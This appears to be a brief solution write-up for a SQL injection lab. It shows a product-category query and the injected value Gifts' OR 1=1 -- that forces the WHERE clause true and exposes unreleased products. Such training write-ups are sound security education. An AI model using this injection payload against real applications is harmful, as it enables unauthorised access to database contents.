## Solution:
Query made -
```sql
SELECT * FROM products WHERE category = 'Gifts' 
```
To view all the products (both released and not released) , we include Gifts' OR 1=1 -- so that it the condition evaluates to TRUE & displayed all the gifts.

The query looks like
```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1 --' 
```
